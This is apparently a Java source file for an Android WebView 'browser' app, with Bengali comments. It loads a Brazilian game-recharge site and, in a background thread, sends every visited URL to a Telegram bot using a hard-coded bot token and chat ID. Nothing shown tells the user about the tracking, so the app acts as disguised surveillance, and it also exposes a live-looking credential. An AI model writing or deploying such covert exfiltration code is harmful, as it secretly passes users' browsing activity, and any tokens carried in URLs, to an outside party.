package com.example.custombrowser; // আপনার প্রজেক্টের প্যাকেজ নেম এখানে থাকবে

import android.os.Bundle;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends AppCompatActivity {

    WebView webView;
    Button btnBack;

    // আপনার টেলিগ্রাম বটের তথ্য
    private final String botToken = "8648558059:AAGiICsBEzdc23c3WSOP-nezU8_P5PZmZLg";
    private final String chatId = "6825685741D"; // এখানে আপনার সঠিক টেলিগ্রাম চ্যাট আইডি লিখবেন

    private final String targetUrl = "https://discstore.recargajogo.com.br/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        btnBack = findViewById(R.id.btnBack);

        // WebView সেটিংস কনফিগারেশন
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // ইউজার সাইটের ভেতরে যেকোনো লিংকে ক্লিক করলে তা ট্র্যাক করে টেলিগ্রামে পাঠানো হবে
                sendUrlToTelegram(url);
                view.loadUrl(url);
                return true;
            }
        });

        // অ্যাপ চালু হওয়ার সাথে সাথে মূল লিংকে প্রবেশ করবে এবং টেলিগ্রামে নোটিফিকেশন যাবে
        sendUrlToTelegram(targetUrl);
        webView.loadUrl(targetUrl);

        // ব্যাক বাটন কার্যকারিতা
        btnBack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (webView.canGoBack()) {
                    webView.goBack();
                }
            }
        });
    }

    // ব্যাকগ্রাউন্ডে টেলিগ্রাম বোটে ইউআরএল পাঠানোর মেথড
    private void sendUrlToTelegram(final String visitedUrl) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String message = "Visited URL: " + visitedUrl;
                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                    
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String data = "chat_id=" + chatId + "&text=" + URLEncoder.encode(message, "UTF-8");
                    
                    OutputStream os = conn.getOutputStream();
                    os.write(data.getBytes());
                    os.flush();
                    os.close();

                    conn.getResponseCode(); // রিকোয়েস্ট এক্সিকিউট করার জন্য
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    // ফোনে ব্যাক বাটন চাপলে যেন অ্যাপ হুট করে বন্ধ না হয়ে ব্রাউজারের পেজ পেছনে যায়
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
